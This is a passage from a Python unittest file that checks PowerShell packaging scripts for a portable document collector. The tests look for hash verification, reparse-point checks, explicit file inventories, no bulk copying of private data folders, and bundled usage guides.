        self.assertIn("Compare-Object", packager)
        self.assertIn("Get-FileHash", packager)
        self.assertIn("verificationRoot", packager)
        self.assertIn("Assert-NoReparseTree", packager)
        self.assertIn("expectedZipHash", packager)
        self.assertIn("expectedZipLength", packager)
        self.assertIn("reparse", packager.lower())
        self.assertRegex(packager, r"(?i)Move-Item.*temporary|temporary.*Move-Item")
        self.assertNotRegex(
            packager,
            r"Remove-Item\s+-LiteralPath\s+\$zip",
        )
        self.assertNotIn("staging-final", packager)

    def test_packager_has_no_broad_copy_of_private_or_build_data(self):
        packager = (ROOT / "empacotar-coletor-portatil.ps1").read_text(
            encoding="utf-8-sig"
        )

        self.assertNotRegex(packager, r"Copy-Item\s+.*\$source\s+.*-Recurse")
        for forbidden in ("downloads", "dados-locais", "acervo-tce", "checkpoint", r"\.pdf", r"\.part"):
            self.assertRegex(packager, rf"(?i){forbidden}")

    def test_public_packager_has_explicit_extension_inventory_and_modules(self):
        packager = (ROOT / "empacotar-coletor-portatil.ps1").read_text(
            encoding="utf-8-sig"
        )
        self.assertIn("extension_exporter.py", packager)
        self.assertIn("package_complete_archive.py", packager)
        self.assertIn("extensao-complementar-ato", packager)
        self.assertIn("$extensionFiles", packager)
        self.assertNotRegex(
            packager,
            r"Copy-Item\s+.*extensao-complementar-ato.*-Recurse",
        )
        for asset in (
            "background/automation-controller.js",
            "content/portal-navigation.js",
            "content/portal-submit.js",
            "lib/automation-preflight.js",
            "lib/automation-schema.js",
            "lib/legal-foundation.js",
            "sidepanel/panel-tokens.css",
            "sidepanel/panel-view.js",
        ):
            with self.subTest(asset=asset):
                self.assertIn(f"'{asset}'", packager)
        for module in (
            "automation_report.py",
            "automation_store.py",
            "legal_context.py",
            "qualification.py",
        ):
            with self.subTest(module=module):
                self.assertIn(f"'{module}'", packager)

        private_packager = (ROOT / "portable" / "Empacotar-Acervo-Completo.ps1").read_text(
            encoding="utf-8-sig"
        )
        self.assertIn("dados-complementar-ato.json", private_packager)
        self.assertIn("package_complete_archive.py", private_packager)
        self.assertIn("--distribution", private_packager)
        self.assertIn("private", private_packager)

    def test_public_packager_includes_easy_usage_guides(self):
        packager = (ROOT / "empacotar-coletor-portatil.ps1").read_text(
            encoding="utf-8-sig"
        )
        required_topics = (
            "Primeiro uso",
            "Uso diário",
            "Extensão",
            "HTML local",
            "Diagnóstico",
            "não envia",
        )

        for filename in ("GUIA-RAPIDO.html", "GUIA-RAPIDO.md"):
            with self.subTest(filename=filename):
                guide = ROOT / "portable" / filename
                self.assertTrue(guide.is_file())
                self.assertIn(f"'{filename}'", packager)
                text = guide.read_text(encoding="utf-8-sig")
                for topic in required_topics:
                    self.assertIn(topic, text)


if __name__ == "__main__":
    unittest.main()
